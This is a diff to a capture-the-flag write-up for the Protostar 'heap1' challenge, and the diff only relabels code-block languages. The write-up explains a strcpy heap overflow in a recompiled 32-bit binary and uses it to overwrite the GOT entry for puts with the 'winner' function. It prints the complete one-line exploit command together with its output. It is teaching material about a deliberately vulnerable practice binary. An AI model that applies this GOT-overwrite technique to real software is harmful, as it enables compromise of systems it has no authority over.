@@ -2,7 +2,7 @@
 
 Let's take a look at the binary. Also this challenge is a bit different from the others, it's from the protostar wargame and the goal is to call the `winner` function (not pop a shell). Also this isn't the original binary, I recompiled it:
 
-```
+```console
 $	file heap1
 heap1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=0840a5076b50649a07ba60e78144b2bf30297c92, not stripped
 $	pwn checksec heap1
@@ -22,7 +22,7 @@ and that's a wrap folks!
 
 So we are dealing with a `32` bit binary with no PIE or RELRO. It also expects two inputs passed as arguments to the program. When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 undefined4 main(undefined4 argc,int argv)
@@ -50,14 +50,14 @@ undefined4 main(undefined4 argc,int argv)
 
 So we can see that this program starts off by allocating two heap structures. The structure of those structures is this:
 
-```
+```text
 0x4:	integer (either 1, or 2)
 0x8:	ptr to eight byte space allocated with malloc
 ```
 
 The bug here is the two `strcpy` calls. They aren't checking if the space it is writing to is big enough to hold the data, so we have an overflow. Taking a look at how the data is laid out in the heap in gdb, we see this:
 
-```
+```gdb
 gef➤  disas main
 Dump of assembler code for function main:
    0x080484e1 <+0>:	lea    ecx,[esp+0x4]
@@ -201,21 +201,21 @@ So we can see that our first input begins at `0x804b170`. We can also see that t
 
 Since RELRO isn't enabled, we can write to the got table. This will make it so when it tries to call one function, it will actually call another. Looking at the disassembly we see that `puts` is called after the `strcpy` calls so that would probably be a good target. We can get it's got table entry (no PIE so we don't need an infoleak here) with objdump:
 
-```
+```console
 $	objdump -R heap1 | grep puts
 0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
 ```
 
 Now instead of executing `puts`, we can just execute the `winner` function instead. We can also find it's address using objdump:
 
-```
+```console
 $	objdump -D heap1 | grep winner
 080484b6 <winner>:
 ```
 
 With that, we have everything we need for our exploit:
 
-```
+```console
 $	./heap1 `python -c 'print "0"*20 + "\x18\xa0\x04\x08" + " " + "\xb6\x84\x04\x08"'`
 and we have a winner
 ```
